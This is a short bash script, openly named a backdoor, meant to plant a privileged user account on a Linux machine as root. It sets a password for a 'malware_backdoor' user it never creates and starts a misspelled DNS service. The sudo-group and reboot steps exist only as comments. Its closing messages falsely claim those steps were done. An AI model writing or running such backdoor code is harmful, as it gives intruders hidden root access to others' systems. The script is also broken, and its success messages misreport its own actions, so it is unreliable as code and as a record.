#!/bin/bash

# Check if running as root
if [[ "$EUID" -ne 0 ]]; then
  echo "Backdoor needs to be run as root!" >&2
  exit 1
fi

# Create a basic user (optional, but recommended)
user="malware_backdoor"
group="malware"
echo "$user:$user" | sudo chpasswd -o

# Ensure the daemon is running
systemctl start dnsmasn.service || sudo systemctl start dnsmasn.service

# Create an entry for the new user in sudoers group using a shell script that is called every time someone logs into the box
# This will allow him to run commands as root (e.g., update packages) without having to enter the password frequently.
# The most efficient way to accomplish this would be to use the command: sudo usermod -aG sudo $user

# Check if the new user is logged in or not, and reboot the box if he isn't, as that could cause issues with access
# This can be done by running the command: sleep 2 && sudo reboot

# If successful, print a message to indicate that the backdoor has been added.
echo "Backdoor Added! Check /var/log/auth.log for new user activity."

# Print out the commands used and where you should check for the user login, etc.
echo "Commands Used:"
echo "1. Created User: $user"
echo "2. Updated sudoers: Adding user to sudo group"
echo "3. Started DNS service: dnsmasn.service"
echo "4. Added Reboot Trigger: Reboots box if needed"
echo "Check logs for details!"

# End of Script - Exit with a success status code
exit 0
